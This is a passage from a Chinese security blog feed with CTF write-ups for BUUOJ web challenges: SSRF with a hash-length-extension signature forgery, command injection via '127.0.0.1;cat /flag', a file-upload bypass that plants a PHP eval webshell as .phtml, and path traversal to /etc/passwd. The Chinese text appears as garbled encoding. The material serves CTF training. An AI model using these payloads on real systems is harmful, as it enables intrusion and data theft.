punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>md5</code> å‡½æ•°ç”¨äºè®¡ç®— MD5 å“ˆå¸Œå€¼ã€‚</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check <span class="token operator">=</span> param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>waf</code> å‡½æ•°ç”¨äºç®€å•çš„ WAF æ£€æŸ¥ï¼Œé˜²æ­¢æŸäº›å±é™©çš„åè®®ã€‚</li></ul><h4 id="7-ä¸»ç¨‹åº"><a href="#7-ä¸»ç¨‹åº" class="headerlink" title="7. ä¸»ç¨‹åº"></a>7. <strong>ä¸»ç¨‹åº</strong></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>ä¸»ç¨‹åºå¯åŠ¨ Flask åº”ç”¨ï¼Œç›‘å¬ 80 ç«¯å£ã€‚</li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„ Web æœåŠ¡ï¼Œç”¨äºå¤„ç†ç½‘ç»œæ‰«æä»»åŠ¡å’Œæ–‡ä»¶è¯»å–ä»»åŠ¡ã€‚å®ƒé€šè¿‡ç­¾åéªŒè¯å’Œç®€å•çš„ WAF æ£€æŸ¥æ¥å¢å¼ºå®‰å…¨æ€§ã€‚</p></blockquote><h2 id="2-2-æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ"><a href="#2-2-æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ" class="headerlink" title="2.2 æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ"></a>2.2 æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ</h2><ul><li>ä¸‰ä¸ªè·¯ç”±</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@app.route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token comment">#è·å–æºä»£ç  </span>@app.route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span>, <span class="token assign-left variable">methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span>, <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#è·å–ç­¾å</span>@app.route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span>, <span class="token assign-left variable">methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span>, <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#ä»cookieä¸­è·å–actionå’Œsignï¼Œå†è·å–å‚æ•°paramä»¥åŠipç„¶åä¼ å…¥Taskç±»ä¸­ï¼Œä»¥jsonå½¢å¼è¿”å›Task-&gt;Exec()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>geneSignç”Ÿæˆçš„å“ˆå¸Œæ„æˆï¼ˆsecret_key + param + actionï¼‰ï¼Œsecret_key æœªçŸ¥ï¼Œä½†æ˜¯paramå¯æ§ï¼Œactionæ˜¯â€œscanâ€å­—ç¬¦ä¸²ã€‚è¿™é‡Œæƒ³åˆ°ç”¨å“ˆå¸Œæ‰©å±•æ”»å‡»ï¼Œåœ¨ä¸çŸ¥é“secret_keyçš„æƒ…å†µä¸‹ä¹Ÿèƒ½è®¡ç®—å“ˆå¸Œå€¼ã€‚ï¼ˆå“ˆå¸Œæ‰©å±•æ”»å‡»è§æœ¬ç«™ï¼šã€Šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‹ä¸€æ–‡ï¼Œ<a href="https://sxksec.cn/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%EF%BC%89">https://sxksec.cn/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/ï¼‰</a></p><blockquote><p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼ˆHash Length Extension Attacksï¼‰æ˜¯ä¸€ç§é’ˆå¯¹æŸäº›åŠ å¯†æ•£åˆ—å‡½æ•°çš„æ”»å‡»æ‰‹æ®µï¼Œç‰¹åˆ«é€‚ç”¨äºé‚£äº›åŸºäºMerkleâ€“DamgÃ¥rdç»“æ„çš„ç®—æ³•ï¼Œå¦‚MD5å’ŒSHA-1ã€‚</p><p><strong>è¿™ç±»æ”»å‡»çš„æ ¸å¿ƒåœ¨äºï¼Œå¦‚æœä½ çŸ¥é“ä¸€ä¸ªæ¶ˆæ¯ï¼ˆmessageï¼‰å’Œå¯†é’¥ï¼ˆkeyï¼‰çš„ç»„åˆçš„å“ˆå¸Œå€¼ï¼Œå³ä½¿ä¸çŸ¥é“å¯†é’¥çš„å…·ä½“å€¼ï¼Œåªè¦çŸ¥é“å¯†é’¥çš„é•¿åº¦ï¼Œä½ å°±èƒ½åœ¨è¿™ä¸ªæ¶ˆæ¯åé¢æ·»åŠ é¢å¤–çš„ä¿¡æ¯ï¼Œå¹¶è®¡ç®—å‡ºæ–°çš„å“ˆå¸Œå€¼ã€‚</strong></p></blockquote><ul><li>scanå‡½æ•°</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>scan</code>æ–¹æ³•ç”¨çš„æ˜¯<code>urllib.urlopen()</code>ï¼Œæ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œé€ æˆäº†SSRFæ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><p>1ï¼‰ç›´æ¥å†™æ–‡ä»¶å<code>flag.txt</code></p><p>2ï¼‰<code>local_file</code> ï¼Œè¿™ä¸ªè¢«è¿‡æ»¤äº†ã€‚</p><p>å…·ä½“å‚è€ƒï¼š<a href="https://bugs.python.org/issue35907">https://bugs.python.org/issue35907</a></p><ul><li>æ‰€ä»¥æ•´ä½“æ€è·¯å¦‚ä¸‹ï¼š</li></ul><p>1ï¼‰é€šè¿‡ä¼ªé€ <code>secret_key +flag.txt+scan+xxxxx...xxx+read</code>çš„å“ˆå¸Œå€¼ï¼Œä½¿å¾—èƒ½å¤Ÿæ»¡è¶³ç­¾åéªŒè¯ã€‚</p><p>2ï¼‰é€šè¿‡scan actionè·å–flag.txtçš„å€¼ï¼Œé€šè¿‡read actionè¯»å–result.txtçš„å€¼ã€‚</p><h1 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h1><h2 id="3-1-ä¼ªé€ ç­¾å"><a href="#3-1-ä¼ªé€ ç­¾å" class="headerlink" title="3.1 ä¼ªé€ ç­¾å"></a>3.1 ä¼ªé€ ç­¾å</h2><ul><li>è·å– <code>secret_key + flag.txt + scan</code>çš„ç­¾åï¼š</li></ul><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/%E6%88%AA%E5%B1%8F2025-02-12%2014.42.06.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">8100319869013029db5beab17bfa9ba9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ„é€ <code>secret_key +flag.txt+scan+xxxxx...xxx+read</code>çš„ç­¾åï¼š</li></ul><p>å› ä¸ºsecret_key + flag.txt +scanæ˜¯å›ºå®šçš„ï¼Œæ‰©å±•çš„å†…å®¹å°±æ˜¯readã€‚<code>secret_key + flag.txt</code>å¯ä»¥è§†ä½œå¯†é’¥ã€‚</p><p>keylength=len(secret_ket)+len(flag.txt)=16+8=24ã€‚</p><p>åˆ©ç”¨<code>hashpump</code>å·¥å…·æ„é€ å“ˆå¸Œå€¼ï¼šï¼ˆæ¨èåœ¨kaliä¸­ä½¿ç”¨ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€<span class="token comment"># hashpump</span>Input Signature: 8100319869013029db5beab17bfa9ba9Input Data: scanInput Key Length: <span class="token number">24</span>Input Data to Add: <span class="token builtin class-name">read</span>677ae112e086b6faf3c0f2088773371cscan<span class="token punctuation">\</span>x80<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>xe0<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è½¬åŒ–ä¸ºurlç¼–ç ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">action</span><span class="token operator">=</span>scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read<span class="token punctuation">;</span><span class="token assign-left variable">sign</span><span class="token operator">=</span>677ae112e086b6faf3c0f2088773371c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-æ„é€ å‚æ•°è·å–flag"><a href="#3-2-æ„é€ å‚æ•°è·å–flag" class="headerlink" title="3.2 æ„é€ å‚æ•°è·å–flag"></a>3.2 æ„é€ å‚æ•°è·å–flag</h2><p><code>/De1ta</code>è·¯ç”±ä¼ å…¥<code>param=flag.txt</code>ï¼Œå¹¶åœ¨cookieè®¾ç½®<code>action</code>å’Œ<code>sign</code>å³å¯å¾—åˆ°flag</p><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/%E6%88%AA%E5%B1%8F2025-02-12%2014.45.53.png" style="zoom:50%;"><p>Flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>24270e18-7136-4fe7-93d6-e61713c16837<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™ä¸ªé¢˜ç›®ç¨å¾®éš¾ä¸€äº›ï¼Œè€ƒç‚¹ä¸»è¦åŒ…æ‹¬ï¼šflask webç³»ç»Ÿä»£ç å®¡è®¡ã€SSRFæ¼æ´è¯»å–æ–‡ä»¶å’Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œç›¸å¯¹æ¯”è¾ƒç»¼åˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> SSRF </tag>
            
            <tag> å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡» </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-[ACTF2020 æ–°ç”Ÿèµ›]Exec</title>
      <link href="/2025/02/12/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/"/>
      <url>/2025/02/12/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.04.46.png" style="zoom:50%;"><ul><li>åˆæ­¥åˆ†æ</li></ul><p>é¡µé¢ä½“ç°å‡ºæ¥çš„åŠŸèƒ½æ˜¯è®©æˆ‘ä»¬ç»™ä¸€ä¸ªipåœ°å€ç„¶åé€šè¿‡pingå‘½ä»¤æµ‹è¯•è¿é€šæ€§ã€‚</p><p>æ—¢ç„¶è¦ä½¿ç”¨pingå‘½ä»¤é‚£ä¹ˆå¿…ç„¶ä¼šè°ƒç”¨åº•å±‚æ“ä½œç³»ç»Ÿçš„å‘½ä»¤ï¼Œå¦‚æœæ˜¯ç®€å•çš„æ‹¼æ¥ç”¨æˆ·çš„è¾“å…¥ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h1 id="äºŒã€è§£é¢˜"><a href="#äºŒã€è§£é¢˜" class="headerlink" title="äºŒã€è§£é¢˜"></a>äºŒã€è§£é¢˜</h1><ul><li>æ¼æ´æµ‹è¯•</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.07.02.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°å›æ˜¾å‡ºäº†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<code>index.php</code></p><p>è¯´æ˜åœ¨æ‰§è¡Œå®Œ<code>ping 127.0.0.1</code>ä¹‹ååˆæ‰§è¡Œäº†lså‘½ä»¤ï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span> /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.09.37.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°flagåœ¨æ ¹ç›®å½•ä¸‹ã€‚</p><ul><li>è·å–flag</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">cat</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.10.37.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>e347ca3a-317b-4f7f-8367-302b6e2eea21<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬å…³è€ƒå¯Ÿçš„æ˜¯æœ€æœ€åŸºç¡€çš„å‘½ä»¤æ‰§è¡Œæ¼æ´çš„æƒ…å†µï¼Œé€šè¿‡<code>;</code>åæ¥ç³»ç»Ÿå‘½ä»¤å³å¯è¾¾åˆ°æ‰§è¡Œä»»æ„å‘½ä»¤çš„ç›®çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-[ACTF2020 æ–°ç”Ÿèµ›]Upload</title>
      <link href="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/"/>
      <url>/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210203751177.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210203829103.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°é¡µé¢å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼Œå¤§æ¦‚ç‡è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ ã€‚</p><h1 id="äºŒã€è§£é¢˜"><a href="#äºŒã€è§£é¢˜" class="headerlink" title="äºŒã€è§£é¢˜"></a>äºŒã€è§£é¢˜</h1><h2 id="2-1-ä¸Šä¼ yjh-php"><a href="#2-1-ä¸Šä¼ yjh-php" class="headerlink" title="2.1 ä¸Šä¼ yjh.php"></a>2.1 ä¸Šä¼ yjh.php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼€å¯æŠ“åŒ…ï¼š</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204200426.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°å¼¹çª—æç¤ºåªå…è®¸ä¸Šä¼ jpgã€pngå’Œgifæ ¼å¼çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä½†æ˜¯yakitæ²¡æŠ“åˆ°åŒ…ï¼Œè¯´æ˜åšäº†å‰ç«¯åç¼€é™åˆ¶ã€‚</p><h2 id="2-2-ç»•è¿‡å‰ç«¯é™åˆ¶"><a href="#2-2-ç»•è¿‡å‰ç«¯é™åˆ¶" class="headerlink" title="2.2 ç»•è¿‡å‰ç«¯é™åˆ¶"></a>2.2 ç»•è¿‡å‰ç«¯é™åˆ¶</h2><p>ä¸Šä¼ yjh.jpgï¼Œç„¶åæŠ“åŒ…æ”¹æˆyjh.php</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204509083.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204614582.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204919146.png" style="zoom:80%;"><p>ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„åœ¨<code>uplo4d</code>ä¸‹ã€‚èƒ½ä¸Šä¼ æˆåŠŸè¯´æ˜æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚</p><ul><li>jpgæ”¹æˆphpåç¼€ï¼š</li></ul><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205134079.png" style="zoom:80%;"><p>æ— æ³•ä¸Šä¼ ã€‚ä½†æ­¤æ—¶Content-Typeç±»å‹å·²ç»æ˜¯<code>image/jpeg</code>ç±»å‹äº†ï¼Œè¯´æ˜ä¸æ˜¯MIMEç±»å‹çš„é—®é¢˜ã€‚</p><p>å¹¶ä¸”æ–‡ä»¶åç¼€æ˜¯jpgçš„æ—¶å€™æ˜¯å¯ä»¥ä¸Šä¼ çš„ï¼Œè¯´æ˜åç«¯å¹¶æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚ä¸éœ€è¦å¤„ç†æ–‡ä»¶å†…å®¹ã€‚</p><p>æ‰€ä»¥æ¨å‡ºåº”è¯¥æ˜¯é»‘åå•æ£€æµ‹</p><h2 id="2-3-ç»•è¿‡é»‘åå•"><a href="#2-3-ç»•è¿‡é»‘åå•" class="headerlink" title="2.3 ç»•è¿‡é»‘åå•"></a>2.3 ç»•è¿‡é»‘åå•</h2><p>å°è¯•php5å¤±è´¥ã€‚</p><p>å°è¯•phtmlæˆåŠŸï¼š</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205716062.png" style="zoom:80%;"><h2 id="2-4-getshell"><a href="#2-4-getshell" class="headerlink" title="2.4 getshell"></a>2.4 getshell</h2><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205825503.png" style="zoom:80%;"><p>èšå‰‘è¿æ¥webshellã€‚</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205927678.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205953966.png" style="zoom:80%;"><p>flagï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>03a43cb0-3289-4db5-882b-119718175b29<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬å…³ä¸»è¦è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ¶‰åŠçš„ç»•è¿‡æ–¹å¼ä¸»è¦æœ‰å‰ç«¯ç»•è¿‡å’Œåç¼€åé»‘åå•æ£€æµ‹ç»•è¿‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-[ACTF2020 æ–°ç”Ÿèµ›]Include</title>
      <link href="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/"/>
      <url>/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><p>é¢˜ç›®é“¾æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://buuoj.cn/challenges<span class="token comment">#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210195605175.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210195804015.png" style="zoom:80%;"><p>ç‚¹å‡»tipsï¼š</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210195827028.png" style="zoom:80%;"><p>é€šè¿‡fileå‚æ•°æä¾›ä¸€ä¸ªæ–‡ä»¶åï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è€ƒå¯Ÿæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h1 id="äºŒã€æ¼æ´æ£€æµ‹"><a href="#äºŒã€æ¼æ´æ£€æµ‹" class="headerlink" title="äºŒã€æ¼æ´æ£€æµ‹"></a>äºŒã€æ¼æ´æ£€æµ‹</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://3961ca17-148a-4df7-9da2-a4ae9c36be4c.node5.buuoj.cn:81/?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200416217.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸåŒ…å«äº†ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶<code>/etc/passwd</code>ã€‚</p><h1 id="ä¸‰ã€æ¼æ´åˆ©ç”¨"><a href="#ä¸‰ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ¼æ´åˆ©ç”¨"></a>ä¸‰ã€æ¼æ´åˆ©ç”¨</h1><p>é‚£ä¹ˆå¦‚ä½•è·å–flagå‘¢ï¼Ÿ</p><h2 id="3-1-å°è¯•åœ¨æ ¹ç›®å½•ä¸‹æ‰¾flag"><a href="#3-1-å°è¯•åœ¨æ ¹ç›®å½•ä¸‹æ‰¾flag" class="headerlink" title="3.1 å°è¯•åœ¨æ ¹ç›®å½•ä¸‹æ‰¾flag"></a>3.1 å°è¯•åœ¨æ ¹ç›®å½•ä¸‹æ‰¾flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200647184.png" style="zoom:83%;"><h2 id="3-2-å°è¯•ç”¨file-ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#3-2-å°è¯•ç”¨file-ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="3.2 å°è¯•ç”¨file://ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>3.2 å°è¯•ç”¨file://ä¼ªåè®®è¯»å–æ–‡ä»¶</h2><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200801999.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200834318.png" style="zoom:70%;"><p>â€‹     å¯èƒ½flagä¸åœ¨æ ¹ç›®å½•ä¸‹ã€‚</p><h2 id="3-3-å°è¯•åŒ…å«å½“å‰é¡µçš„æºä»£ç -php-filter"><a 